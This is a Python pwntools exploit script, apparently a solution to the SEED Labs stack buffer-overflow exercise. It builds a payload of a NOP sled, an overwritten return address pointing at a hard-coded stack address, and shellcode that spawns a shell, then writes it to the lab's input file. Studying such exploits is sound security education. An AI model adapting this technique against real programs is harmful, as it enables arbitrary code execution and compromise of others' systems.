#!/usr/bin/env python3
from pwn import *

# Classic method: shellcode goes AFTER the return address
buffer_addr = 0xffffcce8
ret_offset = 36

# Build payload structure:
# [36 bytes of junk] + [return address] + [NOP sled] + [shellcode]

context.arch = 'i386'
shellcode = asm(shellcraft.sh())

# Fill first 36 bytes with NOPs (will be in buffer)
payload = b'\x90' * ret_offset

# Return address - point PAST the return address into our NOPs/shellcode
# The shellcode will be right after return address in the str[] array
ret_addr = buffer_addr + ret_offset + 8  # Skip past return address, into NOPs

payload += p32(ret_addr)  # Overwrite return address

# Now add NOPs and shellcode (these will be in str[], not buffer)
payload += b'\x90' * 100
payload += shellcode

# Pad to 517 bytes total
payload += b'A' * (517 - len(payload))

print(f"[+] Buffer at: {hex(buffer_addr)}")
print(f"[+] Jumping to: {hex(ret_addr)}")
print(f"[+] Shellcode at approximately: {hex(buffer_addr + ret_offset + 108)}")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Exploit ready! Run: cd ../vulnerable-programs/seedlabs-stack && ./stack")
